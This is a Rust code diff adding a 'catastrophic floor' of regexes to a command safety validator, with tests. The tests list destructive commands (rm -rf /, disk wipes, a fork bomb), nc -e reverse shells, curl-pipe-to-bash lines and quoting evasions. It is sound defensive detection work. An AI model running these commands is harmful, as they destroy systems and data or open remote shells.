@@ -429,6 +429,143 @@ impl SafetyValidator {
     /// assert!(is_dangerous_in_context("rm -rf /", &pattern));
     /// assert!(!is_dangerous_in_context("echo 'rm -rf /'", &pattern));
     /// ```
+    /// The catastrophic-floor regex source patterns. Kept as an associated
+    /// const so tests can assert the compiled count matches the declared count
+    /// (no silent regex drop) and so a future audit can diff this list against
+    /// the `RiskLevel::Critical` entries in `patterns.rs` / `cve_patterns.rs`.
+    ///
+    /// Each entry covers one catastrophic Critical class. See
+    /// [`Self::targets_catastrophic_location`] for the contract.
+    #[rustfmt::skip]
+    const CATASTROPHIC_PATTERNS: &'static [&'static str] = &[
+        // NOTE on anchoring: the destructive *verb* in every command-initiating
+        // pattern is anchored to a statement boundary — start-of-string, a shell
+        // separator (`;`, `|`, `&`, newline), or a `sudo`/`doas` prefix — via the
+        // shared `(?:^|[;&|\n]\s*|(?:sudo|doas)(?:\s+\S+)*\s+)` head. This is what keeps the
+        // floor from firing on `echo 'rm -rf /'` (the `rm` there is preceded by a
+        // quote, not a separator) while still catching `sudo rm -rf /` and
+        // `foo; rm -rf /`. The floor uses plain `is_match` (see
+        // `targets_catastrophic_location`), so it WILL match through quotes around
+        // the *target* (`rm -rf "/"`) — the safe over-match direction.
+        //
+        // ── Recursive delete of root / home / parent / bare wildcard ─────────
+        // Quote-tolerant target of `/`, `//`, `/.`, `/*`, `~`, `~/`, `$HOME`,
+        // `..`, `../`, or a bare `*`. The trailing boundary forbids a deeper
+        // path, so a *specific* subpath (`/tmp/myapp_123`) is NOT caught.
+        //
+        // The skip-group consumes ANY argument token of the SAME rm statement
+        // (flags AND earlier targets, including `--`), not just `-`-prefixed
+        // flags: in a multi-target invocation like `rm -rf /tmp /` the
+        // catastrophic `/` is the SECOND target, and a flags-only group would
+        // leave it unexamined (reviewer finding on #1246). A token is a run of
+        // plain characters, ESCAPED characters (`\;` — so `rm -rf a\;b /etc`
+        // can't hide its later target), or quoted segments (`"a;b"`,
+        // `foo';'bar`). The group deliberately STOPS at a bare `;`/`|`/`&`,
+        // because an argument after an unescaped separator belongs to a
+        // DIFFERENT command (`rm -rf /tmp/x | echo /` must stay blessable);
+        // any rm after a separator is matched as its own statement via the
+        // head.
+        r#"(?:^|[;&|\n]\s*|(?:sudo|doas)(?:\s+\S+)*\s+)rm\s+(?:(?:[^\s;&|"'\\]|\\(?s:.)|"(?:[^"\\]|\\(?s:.))*"|'[^']*')+\s+)*['"]?/+(?:\.|\*)?['"]?(?:\s|$)"#,
+        r#"(?:^|[;&|\n]\s*|(?:sudo|doas)(?:\s+\S+)*\s+)rm\s+(?:(?:[^\s;&|"'\\]|\\(?s:.)|"(?:[^"\\]|\\(?s:.))*"|'[^']*')+\s+)*['"]?~/?(?:\s|$|\*)"#,
+        r#"(?:^|[;&|\n]\s*|(?:sudo|doas)(?:\s+\S+)*\s+)rm\s+(?:(?:[^\s;&|"'\\]|\\(?s:.)|"(?:[^"\\]|\\(?s:.))*"|'[^']*')+\s+)*['"]?\$HOME['"]?(?:\s|$|/|\*)"#,
+        r#"(?:^|[;&|\n]\s*|(?:sudo|doas)(?:\s+\S+)*\s+)rm\s+(?:(?:[^\s;&|"'\\]|\\(?s:.)|"(?:[^"\\]|\\(?s:.))*"|'[^']*')+\s+)*['"]?\.\.?/?['"]?(?:\s|$|\*)"#,
+        r#"(?:^|[;&|\n]\s*|(?:sudo|doas)(?:\s+\S+)*\s+)rm\s+(?:(?:[^\s;&|"'\\]|\\(?s:.)|"(?:[^"\\]|\\(?s:.))*"|'[^']*')+\s+)*['"]?\*(?:\s|$)"#,
+        // ── System-directory recursive delete ────────────────────────────────
+        // Top-level system dirs whose loss is unrecoverable. Anchored with a
+        // trailing boundary that allows `/etc`, `/etc/`, `/etc/*` but NOT
+        // `/etc/foo` — and crucially NOT `/var/tmp/...` (a specific subpath).
+        r#"(?:^|[;&|\n]\s*|(?:sudo|doas)(?:\s+\S+)*\s+)rm\s+(?:(?:[^\s;&|"'\\]|\\(?s:.)|"(?:[^"\\]|\\(?s:.))*"|'[^']*')+\s+)*['"]?(?:/(?:etc|usr|bin|sbin|lib|lib64|boot|var|sys|proc|dev|root|home|opt|srv|System|Library))(?:/\*?)?['"]?(?:\s|$)"#,
+        // Windows drive root recursive delete (WSL / git-bash). Requires a
+        // recursive flag somewhere before the drive-root target; other tokens
+        // (including earlier targets) may sit between them.
+        r#"(?:^|[;&|\n]\s*|(?:sudo|doas)(?:\s+\S+)*\s+)rm\s+(?:(?:[^\s;&|"'\\]|\\(?s:.)|"(?:[^"\\]|\\(?s:.))*"|'[^']*')+\s+)*-\S*r\S*\s+(?:(?:[^\s;&|"'\\]|\\(?s:.)|"(?:[^"\\]|\\(?s:.))*"|'[^']*')+\s+)*['"]?[A-Za-z]:[\\/]"#,
+        // ── Explicit root-protection bypass — always catastrophic ────────────
+        r"--no-preserve-root",
+        // ── Whole-disk / device destruction ──────────────────────────────────
+        // A raw disk device node (Linux + BSD/macOS families) is only
+        // catastrophic when a *destructive* op touches it — `ls /dev/da0` is
+        // harmless. Require a destructive verb (`dd`, `mkfs`, `newfs`, `shred`,
+        // `wipefs`, `dd`) appearing before the device node anywhere on the line,
+        // OR an output redirect into the device.
+        r"\b(?:dd|mkfs(?:\.\w+)?|newfs|shred|wipefs)\b[^\n]*?/dev/(?:sd|hd|nvme|mmcblk|vd|xvd|da|ada|nvd|md|disk)\d*[a-z]?\d*",
+        r">\s*/dev/(?:sd|hd|nvme|mmcblk|vd|xvd|da|ada|nvd|md|disk)\d*[a-z]?\d*",
+        // ── ZFS / LVM destruction ────────────────────────────────────────────
+        r"\bzfs\s+destroy\b",
+        r"\bzpool\s+(?:destroy|labelclear)\b",
+        r"\b(?:lvremove|vgremove)\b",
+        // ── Network backdoors / reverse shells ───────────────────────────────
+        // nc/ncat with -e (exec) is a reverse/bind shell regardless of order.
+        r"\bn(?:c|cat)\s+\S*.*-[a-z]*e\b",
+        // ── Remote-exec piped into a shell (with or without sudo) ─────────────
+        r"\b(?:curl|wget)\b[^\n]*\|\s*(?:sudo\s+)?(?:bash|sh|zsh|fish)\b",
+        // ── Windows destructive commands ─────────────────────────────────────
+        r"(?i)(?:^|[;&|\n]\s*)format\s+[A-Za-z]:",
+        r"(?i)(?:^|[;&|\n]\s*)del\s+/[a-z]*[fs]",
+        r"(?i)(?:^|[;&|\n]\s*)rd\s+/s\b",
+        // ── Fork bomb — not path-based but irrecoverable; never bless ─────────
+        r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:",
+    ];
+
+    /// Number of catastrophic-floor patterns. Tests assert the compiled regex
+    /// count equals this, catching any silently-dropped pattern.
+    #[cfg(test)]
+    const CATASTROPHIC_PATTERN_COUNT: usize = Self::CATASTROPHIC_PATTERNS.len();
+
+    /// Lazily compile (and cache) the catastrophic-floor regexes.
+    ///
+    /// Unlike the built-in / CVE pattern loaders, this **panics** on a bad
+    /// pattern instead of silently dropping it (`filter_map(..ok())`). The floor
+    /// is the last line of defence against allowlist-bypassed catastrophe; a
+    /// pattern that fails to compile is a build-time bug that must fail loud, not
+    /// a rule we can afford to lose at runtime. The patterns are compile-time
+    /// constants, so this panic can only fire if a developer edits
+    /// [`Self::CATASTROPHIC_PATTERNS`] with invalid syntax — exactly when we
+    /// want a loud failure (caught by `floor_regexes_all_compile`).
+    fn catastrophic_regexes() -> &'static Vec<regex::Regex> {
+        static CATASTROPHIC: std::sync::OnceLock<Vec<regex::Regex>> = std::sync::OnceLock::new();
+        CATASTROPHIC.get_or_init(|| {
+            Self::CATASTROPHIC_PATTERNS
+                .iter()
+                .map(|p| {
+                    regex::Regex::new(p).unwrap_or_else(|e| {
+                        panic!("catastrophic floor pattern {p:?} is invalid: {e}")
+                    })
+                })
+                .collect()
+        })
+    }
+
+    /// True when a command targets a *catastrophic* location — one whose
+    /// destruction is irrecoverable and system-wide. These targets are NEVER
+    /// allowlistable: no user-supplied allowlist pattern, however specific,
+    /// may re-enable them. This is the safety floor introduced in #1110 and
+    /// hardened in #1246.
+    ///
+    /// It deliberately does NOT cover specific deep subpaths such as
+    /// `/tmp/myapp_123` or `./target`. Those still match a Critical built-in
+    /// (the broad `rm -rf /…` pattern over-matches any absolute path), but a
+    /// *deliberate, narrow* allowlist entry is allowed to bless them — that is
+    /// the entire purpose of the allowlist feature.
+    ///
+    /// # Why plain `is_match` (not `is_dangerous_in_context`)
+    ///
+    /// The floor uses raw `regex.is_match()` rather than the quote/echo-aware
+    /// [`Self::is_dangerous_in_context`]. The context heuristic exists to avoid
+    /// *false positives* when a dangerous string merely appears inside a quoted
+    /// argument (e.g. `echo 'rm -rf /'`). But the floor only ever runs **after**
+    /// a command has ALREADY matched a Critical built-in pattern, and its job is
+    /// to decide whether an allowlist may override that match. In that role,
+    /// erring toward "catastrophic" is the *safe* direction: the worst case is
+    /// that a genuinely-benign Critical command can't be allowlisted, never that
+    /// a catastrophe slips through. Quoting (`rm -rf "$HOME"`, `rm -rf "/"`) is a
+    /// real evasion vector here, so we must match through quotes — exactly what
+    /// the context heuristic would wrongly suppress.
+    fn targets_catastrophic_location(command: &str) -> bool {
+        Self::catastrophic_regexes()
+            .iter()
+            .any(|re| re.is_match(command))
+    }
+
     fn is_dangerous_in_context(command: &str, pattern_regex: &regex::Regex) -> bool {
         if !pattern_regex.is_match(command) {
             return false;
@@ -480,22 +617,39 @@ impl SafetyValidator {
             });
         }
 
-        // First pass: detect whether the command matches a built-in or CVE
-        // pattern at Critical risk. Critical built-ins are NEVER bypassed by
-        // user-supplied allowlists — `rm -rf /` is dangerous regardless of
-        // what's in patterns.toml. Without this guard a permissive
-        // `allowlist_patterns = ["^rm"]` would silently re-enable disaster.
+        // Built-in + CVE pattern sets for this shell, reused by the scan loops
+        // below.
         let built_in_patterns = patterns::get_compiled_patterns_for_shell(shell);
         let cve_compiled = cve_patterns::get_cve_compiled_patterns_for_shell(shell);
-        let has_critical_builtin_or_cve_match = built_in_patterns
-            .iter()
-            .chain(cve_compiled.iter())
-            .any(|(regex, level, _desc, _)| {
-                *level == RiskLevel::Critical && Self::is_dangerous_in_context(command, regex)
-            });
 
-        // Check allowlist patterns only if no Critical built-in/CVE match.
-        if !has_critical_builtin_or_cve_match {
+        // The Critical-bypass guard is intentionally blunt: the broad
+        // recursive-delete pattern (`rm -rf /…`) matches both the catastrophic
+        // `rm -rf /` and an ordinary `rm -rf /tmp/myapp_123`. Refusing to honour
+        // the allowlist for *every* Critical match defeats the purpose of
+        // allowlists, which exist precisely so a team can bless a narrow,
+        // specific recursive cleanup. We therefore only force-block (bypass the
+        // allowlist) when the command targets a *catastrophic* location (root,
+        // system dir, home, bare wildcard, parent dir, device node, disk wipe,
+        // root-protection bypass, reverse shell, remote-exec-as-root, fork bomb,
+        // …). A Critical match on a specific deep path may still be blessed by a
+        // deliberate allowlist entry — but the catastrophic floor is preserved.
+        //
+        // The floor (`targets_catastrophic_location`) is its own curated,
+        // quote-tolerant set of catastrophic Critical patterns, so it is
+        // authoritative on its own: we do NOT additionally require a separate
+        // built-in/CVE Critical hit. The original #1246 form gated on
+        // `has_critical_builtin_or_cve_match && targets_catastrophic_location`,
+        // but the quote-suppressing built-in scan misses evasions like
+        // `rm -rf "/"` and `rm --recursive --force /` that the floor *does*
+        // catch — so requiring a built-in hit re-opened a hole. The floor alone
+        // decides whether the allowlist may run; the escalation block further
+        // down forces the reported risk level to Critical to keep the result
+        // consistent with that decision.
+        let critical_is_catastrophic = Self::targets_catastrophic_location(command);
+
+        // Check allowlist patterns only if there is no catastrophic Critical
+        // match.
+        if !critical_is_catastrophic {
             for allow_pattern in &self.config.allowlist_patterns {
                 if let Ok(regex) = regex::Regex::new(allow_pattern) {
                     if regex.is_match(command) {
@@ -552,6 +706,22 @@ impl SafetyValidator {
                     highest_risk = *risk_level;
                 }
                 warnings.push(format!("{}: {}", risk_level, description));
+            }
+        }
+
+        // Catastrophic-floor escalation. If the command targets a catastrophic
+        // location, force the reported risk to Critical even when the
+        // quote-suppressing built-in scan above produced a lower (or no) match —
+        // e.g. `rm -rf "/"`, `rm -rf "$HOME"`, `rm --recursive --force /`. The
+        // floor already barred the allowlist short-circuit; this makes the
+        // returned `risk_level`/`allowed` consistent with that decision so the
+        // command can never be silently downgraded to Safe/allowed.
+        if critical_is_catastrophic && highest_risk < RiskLevel::Critical {
+            highest_risk = RiskLevel::Critical;
+            let note = "Critical: command targets a catastrophic, irrecoverable location";
+            if !matched.iter().any(|m| m.contains("catastrophic")) {
+                matched.push(note.to_lowercase());
+                warnings.push(note.to_string());
             }
         }
 
@@ -807,7 +977,7 @@ impl SafetyConfig {
             // Add pattern anyway for deferred validation (see method docs)
             self.custom_patterns.push(pattern);
             return Err(ValidationError::PatternError {
-                pattern: format!("{}: {}", &self.custom_patterns.last().unwrap().pattern, e),
+                pattern: format!("{}: {}", self.custom_patterns.last().unwrap().pattern, e),
             });
         }
 
@@ -931,5 +1101,332 @@ mod smart_blend_tests {
         let d = blend_smart_decision(RiskLevel::Safe, Some(&j), SafetyLevel::Moderate, true);
         assert!(!d.requires_confirmation);
         assert!(!d.blocked);
+    }
+}
+
+#[cfg(test)]
+mod allowlist_catastrophic_tests {
+    use super::*;
+    use crate::models::ShellType;
+
+    /// The canonical catastrophic example for every Critical command class in
+    /// `patterns.rs` / `cve_patterns.rs`. The floor MUST treat each of these as
+    /// catastrophic so that no allowlist — however broad — can re-enable them.
+    ///
+    /// This list is the single source of truth shared by
+    /// [`catastrophic_targets_are_never_allowlistable`] and
+    /// [`cross_reference_every_critical_class_is_covered`]. When a new Critical
+    /// class lands in `patterns.rs`, add its canonical example here so the floor
+    /// cannot silently drift behind the pattern database.
+    const CATASTROPHIC_EXAMPLES: &[&str] = &[
+        // ── Recursive delete of root / home / parent / wildcard ──────────────
+        "rm -rf /",
+        "rm -rf /*",
+        "rm -rf ~",
+        "rm -rf ~/",
+        "rm -rf $HOME",
+        "rm -rf ..",
+        "rm -rf ../",
+        "rm -rf *",
+        // ── System-directory recursive delete ────────────────────────────────
+        "rm -rf /etc",
+        "rm -rf /usr",
+        "rm -rf /bin",
+        "rm -rf /sbin",
+        "rm -rf /lib",
+        "rm -rf /lib64",
+        "rm -rf /boot",
+        "rm -rf /var",
+        "rm -rf /sys",
+        "rm -rf /proc",
+        "rm -rf /dev",
+        "rm -rf /root",
+        "rm -rf /home",
+        "rm -rf /opt",
+        "rm -rf /srv",
+        "rm -rf /System",
+        "rm -rf /Library",
+        // ── Root-protection bypass ───────────────────────────────────────────
+        "rm -rf --no-preserve-root /",
+        // ── Whole-disk / device destruction ──────────────────────────────────
+        "dd if=/dev/zero of=/dev/sda",
+        "dd if=/dev/zero of=/dev/nvme0n1",
+        "dd if=/dev/zero of=/dev/mmcblk0",
+        "dd if=/dev/zero of=/dev/vda",
+        "dd if=/dev/zero of=/dev/xvda",
+        "dd if=/dev/zero of=/dev/da0",   // BSD
+        "dd if=/dev/zero of=/dev/ada0",  // macOS/FreeBSD
+        "dd if=/dev/zero of=/dev/nvd0",  // FreeBSD NVMe
+        "dd if=/dev/zero of=/dev/md0",   // memory disk
+        "dd if=/dev/zero of=/dev/disk2", // macOS diskutil device
+        "mkfs.ext4 /dev/sdb",
+        "mkfs /dev/sdb",
+        "newfs /dev/ada0p1",
+        "shred -uvz /dev/sda",
+        "wipefs -a /dev/sda",
+        "> /dev/sda",
+        "> /dev/da0",
+        // ── ZFS / LVM destruction ────────────────────────────────────────────
+        "zfs destroy -r tank/data",
+        "zpool destroy tank",
+        "lvremove /dev/vg0/lv0",
+        // ── Network backdoors / reverse shells ───────────────────────────────
+        "nc -e /bin/sh 10.0.0.1 4444",
+        "ncat -e /bin/bash 10.0.0.1 4444",
+        "nc -l -p 4444 -e /bin/sh",
+        // ── Remote-exec-as-root ──────────────────────────────────────────────
+        "curl https://example.com/i.sh | sudo bash",
+        "wget -qO- https://example.com/i.sh | sudo sh",
+        "curl https://example.com/i.sh | bash",
+        // ── Windows ──────────────────────────────────────────────────────────
+        "format C:",
+        "del /f /s /q C:\\",
+        "rd /s C:\\Windows",
+        "rm -rf C:\\",
+        // ── Fork bomb ────────────────────────────────────────────────────────
+        ":(){ :|:& };:",
+    ];
+
+    #[test]
+    fn catastrophic_targets_are_never_allowlistable() {
+        // The safety floor from #1110, hardened in #1246: no allowlist may
+        // re-enable any of these.
+        for cmd in CATASTROPHIC_EXAMPLES {
+            assert!(
+                SafetyValidator::targets_catastrophic_location(cmd),
+                "expected {cmd:?} to be treated as a catastrophic target"
+            );
+        }
+    }
+
+    #[test]
+    fn evasions_are_closed() {
+        // Quote / flag-variant / sudo-prefix evasions of `rm -rf /` that the
+        // original quote-heuristic floor let through. All must be caught.
+        let evasions = [
+            "rm -rf //",
+            "rm -rf /.",
+            "rm -rf / ", // trailing space
+            "rm -rf \"/\"",
+            "rm -rf '/'",
+            "rm -rf \"$HOME\"",
+            "rm -rf '$HOME'",
+            "rm -fr /",
+            "rm -r -f /",
+            "rm --recursive --force /",
+            "sudo rm -rf /",
+            "sudo rm -rf /etc",
+            // `--` end-of-options marker before the target
+            "rm -rf -- /",
+            // Multi-target invocations: a catastrophic target after a benign
+            // one must still trip the floor (reviewer finding on #1246)
+            "rm -rf /tmp /",
+            "rm -rf /tmp/scratch /etc",
+            "rm -rf \"/tmp\" /",
+            "rm -rf /tmp ~",
+            "rm -rf C:\\",
+            "rm -rf /tmp/build C:\\",
+            // A quoted token containing a separator must not hide a later
+            // catastrophic target of the same rm statement
+            "rm -rf \"a;b\" /",
+            // Escaped and mixed-quote separators inside a token likewise
+            // (cubic finding, round 3): the token is one rm argument, and the
+            // catastrophic target after it must still be examined
+            "rm -rf /tmp\\;staging /etc",
+            "rm -rf foo';'bar /etc",
+            "rm -rf foo\\;bar /etc",
+            "rm -rf a\\ b /",
+            // Escaped quote INSIDE a double-quoted token, and backslash-
+            // newline line continuation (cubic finding, round 4): both are
+            // single-rm invocations in bash whose final target is
+            // catastrophic
+            "rm -rf \"a\\\";b\" /",
+            "rm -rf /tmp \\\n /",
+            // Privilege wrappers with options (cubic finding, round 5): the
+            // wrapper head must consume option tokens before rm
+            "sudo -n rm -rf /",
+            "sudo -u root rm -rf /etc",
+            "sudo -- rm -rf /",
+            "doas -u root rm -rf ~",
+            // Compound statements: the catastrophic rm after the separator is
+            // its own statement and trips the floor via the head anchor
+            "rm -rf /tmp/cache; rm -rf /",
+            "rm -rf /tmp/cache | rm -rf /",
+            "rm -rf /tmp/cache && sudo rm -rf /etc",
+        ];
+        for cmd in evasions {
+            assert!(
+                SafetyValidator::targets_catastrophic_location(cmd),
+                "evasion {cmd:?} must be treated as a catastrophic target"
+            );
+        }
+    }
+
+    #[test]
+    fn specific_subpaths_are_not_catastrophic() {
+        // Specific deep paths still match a Critical built-in, but are NOT
+        // catastrophic, so a deliberate allowlist entry may bless them.
+        let specific = [
+            "rm -rf /tmp/myapp_123",
+            "rm -rf /tmp/other_app",
+            "rm -rf /var/tmp/build_cache",
+            "rm -rf /var/lib/docker/tmp",
+            "rm -rf ./target",
+            "rm -rf node_modules",
+            // Multi-target with ONLY specific subpaths stays blessable
+            "rm -rf /tmp/myapp_123 /tmp/myapp_456",
+            "rm -rf -- /tmp/myapp_123",
+            // A later command in a compound statement owns its own arguments;
+            // `/` here belongs to `echo`, not `rm` (reviewer finding on #1246)
+            "rm -rf /tmp/myapp_123 | echo /",
+            "rm -rf /tmp/myapp_123 && ls /",
+            "rm -rf /tmp/myapp_123; du -sh /",
+        ];
+        for cmd in specific {
+            assert!(
+                !SafetyValidator::targets_catastrophic_location(cmd),
+                "expected {cmd:?} NOT to be treated as a catastrophic target"
+            );
+        }
+    }
+
+    /// Cross-reference guard: every canonical Critical example must be caught by
+    /// the floor. This is the anti-drift test — it shares
+    /// [`CATASTROPHIC_EXAMPLES`] with the allowlist invariants so the floor
+    /// cannot fall behind `patterns.rs` without a test going red.
+    #[test]
+    fn cross_reference_every_critical_class_is_covered() {
+        for cmd in CATASTROPHIC_EXAMPLES {
+            assert!(
+                SafetyValidator::targets_catastrophic_location(cmd),
+                "Critical class example {cmd:?} is not covered by the catastrophic \
+                 floor — patterns.rs and targets_catastrophic_location have drifted"
+            );
+        }
+    }
+
+    #[test]
+    fn floor_regexes_all_compile() {
+        // No silent regex drop: the floor must compile exactly the number of
+        // patterns it declares. `catastrophic_regexes()` panics on a bad
+        // pattern, so merely calling it proves every pattern is valid; we also
+        // assert a non-trivial count so an accidental truncation is caught.
+        let regexes = SafetyValidator::catastrophic_regexes();
+        assert_eq!(
+            regexes.len(),
+            SafetyValidator::CATASTROPHIC_PATTERN_COUNT,
+            "floor compiled a different number of regexes than declared"
+        );
+        assert!(
+            regexes.len() >= 15,
+            "floor unexpectedly small — a pattern class may have been dropped"
+        );
+    }
+
+    #[tokio::test]
+    async fn deliberate_allowlist_blesses_specific_path_but_not_others() {
+        let mut config = SafetyConfig::strict();
+        config.add_allowlist_pattern(r"rm -rf /tmp/myapp_\d+");
+        let validator = SafetyValidator::new(config).unwrap();
+
+        let allowed = validator
+            .validate_command("rm -rf /tmp/myapp_123", ShellType::Bash)
+            .await
+            .unwrap();
+        assert!(
+            allowed.allowed,
+            "deliberate, specific allowlist entry should bless rm -rf /tmp/myapp_123"
+        );
+
+        // A different specific path that is NOT in the allowlist stays blocked
+        // (Critical built-in still fires, no allowlist hit).
+        let blocked = validator
+            .validate_command("rm -rf /tmp/other_app", ShellType::Bash)
+            .await
+            .unwrap();
+        assert!(
+            !blocked.allowed,
+            "non-allowlisted recursive delete must stay blocked"
+        );
+    }
+
+    #[tokio::test]
+    async fn allowlist_cannot_reenable_catastrophe() {
+        // Even maximally-permissive allowlists must NOT re-enable any
+        // catastrophic command. We register a separate permissive entry for
+        // every catastrophic command family (rm / dd / nc / ncat / curl / wget
+        // / format / del / rd / mkfs / newfs / shred / wipefs / zfs / zpool /
+        // lvremove / fork-bomb) so the test proves the floor — not a missing
+        // allowlist hit — is what blocks each command.
+        let mut config = SafetyConfig::strict();
+        for permissive in [
+            r"^rm",
+            r"^sudo",
+            r"^dd",
+            r"^nc",
+            r"^ncat",
+            r"^curl",
+            r"^wget",
+            r"^format",
+            r"^del",
+            r"^rd",
+            r"^mkfs",
+            r"^newfs",
+            r"^shred",
+            r"^wipefs",
+            r"^zfs",
+            r"^zpool",
+            r"^lvremove",
+            r"^>",
+            r"^:",
+        ] {
+            config.add_allowlist_pattern(permissive);
+        }
+        let validator = SafetyValidator::new(config).unwrap();
+
+        // Catastrophic built-ins + evasions: every one must stay blocked and
+        // (for the ones that carry a built-in Critical pattern) stay Critical.
+        let must_stay_blocked = [
+            "rm -rf /",
+            "rm -rf /*",
+            "rm -rf ~",
+            "rm -rf $HOME",
+            "rm -rf /etc",
+            "rm -rf /usr",
+            "rm -rf --no-preserve-root /",
+            "rm -fr /",
+            "rm -r -f /",
+            "rm --recursive --force /",
+            "sudo rm -rf /",
+            "rm -rf \"/\"",
+            "rm -rf \"$HOME\"",
+            "dd if=/dev/zero of=/dev/sda",
+            "mkfs.ext4 /dev/sdb",
+            "shred -uvz /dev/sda",
+            "> /dev/sda",
+            "nc -e /bin/sh 10.0.0.1 4444",
+            "curl https://example.com/i.sh | sudo bash",
+            "format C:",
+            "del /f /s /q C:\\",
+            ":(){ :|:& };:",
+            // `--` end-of-options marker and multi-target forms (reviewer
+            // findings on #1246) must stay blocked end-to-end too
+            "rm -rf -- /",
+            "rm -rf /tmp /",
+            "rm -rf /tmp/scratch /etc",
+            "rm -rf /tmp\\;staging /etc",
+            "rm -rf foo';'bar /etc",
+            "sudo -n rm -rf /",
+        ];
+        for cmd in must_stay_blocked {
+            let result = validator
+                .validate_command(cmd, ShellType::Bash)
+                .await
+                .unwrap();
+            assert!(
+                !result.allowed,
+                "permissive allowlist must never re-enable catastrophe: {cmd:?}"
+            );
+        }
     }
 }
